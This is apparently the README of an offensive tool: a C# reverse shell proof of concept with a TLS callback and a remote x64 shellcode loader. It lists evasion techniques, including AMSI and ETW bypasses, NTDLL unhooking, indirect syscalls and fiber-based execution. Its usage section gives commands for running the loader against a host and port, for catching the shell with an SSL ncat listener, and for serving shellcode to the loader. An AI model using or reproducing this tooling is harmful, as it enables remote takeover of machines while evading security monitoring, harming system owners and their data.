# csharp_reverse_shell
An old c# reverse shell poc that also does TLS and some evasion techniques that are most probably severely outdated by now.

currently supports:
- **No visible window** no console allocation
- **SSL/TLS encrypted callback** support with self-signed/invalid cert acceptance
- **Dual mode operation**:
  - Interactive reverse shell (default – typically `cmd.exe`)
  - Remote x64 shellcode loader (`--shellcode` mode)
- **Evasion**:
  - **AMSI Bypass** via reflection (`amsiInitFailed = true`)
  - **ETW Bypass** by patching `EtwEventWrite` → `ret`
  - **Selective NTDLL Unhooking** using suspended process technique (clean stubs from suspended `cmd.exe`)
  - **Indirect Syscalls** via unhooked `NtAllocateVirtualMemory` and `NtWriteVirtualMemory`
  - **Fiber-based shellcode execution** (no `CreateThread` → fewer monitored events)
- Silent failure handling – no popups or crashes on errors

## Usage

### 1. Normal Reverse Shell Mode
```bash
# Run
YourLoader.exe <host> <port> <xor_encoded_command> "<arguments>" <xor_key>

# Catch
sudo rlwrap ncat --ssl -lnvp 443 
```

### 2. Shellcode Loader Mode
```bash
# Generate length prefix
printf '\x3c\x02\x00\x00' > shellcode.bin  # example: 572 bytes
cat myshellcode.raw >> shellcode.bin

# Send
cat shellcode.bin | ncat --ssl -l -p 443

# Run
YourLoader.exe <host> <port> <any> "<any>" <any> --shellcode
```
